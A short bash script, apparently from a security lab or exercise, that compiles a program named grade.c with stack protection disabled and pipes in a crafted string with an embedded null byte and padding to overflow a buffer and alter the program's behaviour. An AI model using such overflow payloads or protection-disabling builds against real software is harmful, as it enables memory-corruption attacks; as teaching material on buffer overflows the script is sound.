#!/usr/bin/env bash

gcc -m32 -g -fno-stack-protector -w -o grade grade.c

python3 -c 'print("a1234567\0" + "A"*11)' | ./grade